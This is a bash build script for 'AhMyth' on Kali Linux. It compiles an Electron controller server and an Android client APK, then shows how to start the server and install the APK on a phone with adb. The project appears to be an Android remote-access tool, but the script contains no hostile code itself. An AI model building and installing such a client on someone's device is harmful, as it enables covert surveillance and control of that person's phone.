#!/bin/bash
# AhMyth Build Script for Kali Linux
# This script builds both the server and client components

set -e

echo "=== AhMyth Build Script for Kali Linux ==="
echo "Building both server and client components..."
echo ""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Function to print colored output
print_status() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Check if we're on Kali Linux
if ! grep -q "Kali" /etc/os-release 2>/dev/null && ! grep -q "kali" /etc/os-release 2>/dev/null; then
    print_warning "This script is optimized for Kali Linux but can run on other Debian-based systems"
fi

# Build Server Component
print_status "Building AhMyth Server (Electron App)..."
cd AhMyth-Server

if [ ! -d "node_modules" ]; then
    print_status "Installing server dependencies..."
    npm install
fi

print_status "Building server for Linux..."
npm run build:linux64

if [ $? -eq 0 ]; then
    print_status "Server build completed successfully!"
else
    print_error "Server build failed!"
    exit 1
fi

cd ..

# Build Client Component (Android)
print_status "Building AhMyth Client (Android APK)..."
cd AhMyth-Client

# Check if Android SDK is available
if [ -z "$ANDROID_HOME" ]; then
    print_warning "ANDROID_HOME not set. Please install Android SDK and set ANDROID_HOME"
    print_warning "On Kali Linux: apt install android-sdk"
fi

# Update Gradle wrapper if needed
if [ ! -f "gradlew" ]; then
    print_error "Gradle wrapper not found!"
    exit 1
fi

print_status "Building Android APK..."
chmod +x gradlew

# Build debug APK
./gradlew assembleDebug

if [ $? -eq 0 ]; then
    print_status "Android APK built successfully!"
    print_status "APK location: $(pwd)/app/build/outputs/apk/debug/app-debug.apk"
else
    print_error "Android APK build failed!"
    exit 1
fi

cd ..

# Summary
echo ""
echo "=== BUILD SUMMARY ==="
print_status "✅ Server built for Linux: AhMyth-Server/dist/"
print_status "✅ Client APK built: AhMyth-Client/app/build/outputs/apk/debug/app-debug.apk"
echo ""
print_status "To run the server:"
echo "  cd AhMyth-Server && npm start"
echo ""
print_status "To install the APK on Android device:"
echo "  adb install AhMyth-Client/app/build/outputs/apk/debug/app-debug.apk"
echo ""
print_status "Build completed successfully! 🎉"
